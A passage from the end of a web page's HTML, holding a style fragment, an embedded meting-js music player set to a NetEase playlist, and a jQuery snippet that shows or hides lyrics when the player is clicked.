    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>